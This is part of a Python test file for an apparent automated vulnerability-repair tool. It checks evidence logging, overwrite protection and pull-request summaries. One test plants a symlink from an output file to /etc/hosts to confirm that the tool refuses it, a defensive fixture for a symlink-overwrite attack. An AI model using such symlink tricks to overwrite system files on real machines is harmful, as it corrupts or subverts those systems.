        assert ev["verdict"] == "VERIFIED_SCOPED" and "fix_diff" not in ev and "path_tokens" not in ev
        assert ev["generator_commit"] == "c" * 40 and ev["generator_clean"] and "evidence_sha256" in ev
        blob = open(os.path.join(d, "evidence.json")).read() + open(os.path.join(d, "full_command_log.txt")).read()
        assert "/tmp/xyz/run" not in blob and "$RUN" in blob
        assert ev["commands"][0]["stdout_sha256"] and "stdout" not in ev["commands"][0]
        # canonicalised byte length (NOT the raw, path-dependent total) + honest truncation flag
        assert ev["commands"][0]["stdout_bytes"] == len("ok $RUN") and "stdout_total" not in ev["commands"][0]
        assert ev["commands"][0]["truncated"] is False
        # refuse existing output unless force
        with pytest.raises(repair.SecurityError):
            repair.write_artifacts(res, d)
        repair.write_artifacts(res, d, force=True)                        # force: allowed


def test_write_artifacts_refuses_symlinked_output():
    res = _fake_result()
    with tempfile.TemporaryDirectory() as d:
        os.symlink("/etc/hosts", os.path.join(d, "fix.diff"))
        with pytest.raises(repair.SecurityError):                         # a symlinked output is refused
            repair.write_artifacts(res, d)


def test_pr_body_scoped_and_needs_review():
    body = repair.pr_body(_fake_result("VERIFIED_SCOPED"))
    assert "**VERIFIED_SCOPED**" in body and "Reachable loaders (5)" in body and "BMP, PNM" in body
    assert "**NEEDS_REVIEW**" in repair.pr_body(_fake_result("NEEDS_REVIEW", ["2 merge conflict(s)"]))
